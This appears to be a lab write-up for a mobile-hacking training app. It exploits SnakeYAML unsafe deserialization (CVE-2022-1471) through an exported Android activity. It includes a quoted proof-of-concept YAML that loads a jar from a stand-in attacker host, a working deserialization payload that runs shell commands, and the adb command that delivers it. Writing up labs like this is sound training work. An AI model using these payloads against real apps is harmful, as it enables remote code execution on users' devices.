We decompile the apk with jadx and check the manifest file:

![](<./assets/Config Editor/20251119194604198-Config Editor.png>)

We see that the MainActivity is exported and accept an intent that follows a specific schema that accepts `file:///`. Also we notice that the MainActivity imports the SnakeYAML library:

![](<assets/Config Editor/20251119194604306-Config Editor.png>)

Searching online we find that SnakeYAML has an old CVE-2022-1471. This blogpost describe the poc:

https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471

the yaml file needs to have the following form:

```
person: !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
        !!java.net.URL [http://attacker.com/malicious-code.jar]
    ]]
]
```

The YAML is unsafely deserialized, causing a type to be constructed that loads malicious-code.jar.
Therefore, if we have an unsafe class we can reference that class and by crafting a malicious yaml file we may have RCE. The unsafe clas in this case is `LegacyCommandUtil`:

![](<assets/Config Editor/20251119194604382-Config Editor.png>)

which can execute arbitrary code (if OS permissions allow that). 

In order to show RCE we will use the following payload:

```
!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /sdcard/rce.txt"]
```

We push the malicious.yml file to the device sdcard:

![](<assets/Config Editor/20251119194604441-Config Editor.png>)

Then, run the adb activity manager command to start the mainactivity with the intent and the URI data pointing to the malicious.yml in sdcard. The adb command is the following one:

```
adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "file:///sdcard/malicious.yml"
```

This should work because the intent is handled in the following way:


![](<assets/Config Editor/20251119194604500-Config Editor.png>)

Hence, the file at URI is passed to the function loadYaml that uses the vulnerable library SnakeYAML.

The file rce.txt is correctly created, hence RCE is confirmed:

![](<assets/Config Editor/20251119194604549-Config Editor.png>)



- Identified `MainActivity` as **exported** and accepting `VIEW` intents for `file://`, `http://`, and `https://` with MIME type `application/yaml`.
- Identified vulnerable library SnakeYAML
- Found **`LegacyCommandUtil`** class invoking `Runtime.getRuntime().exec()` upon instantiation.
- Created malicious YAML payload:  
    `!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/data/com.mobilehackinglab.configeditor/hacked"] and pushed to /sdcard`
- Load payload/yaml via:
    `adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "file:///sdcard/malicious.yml"`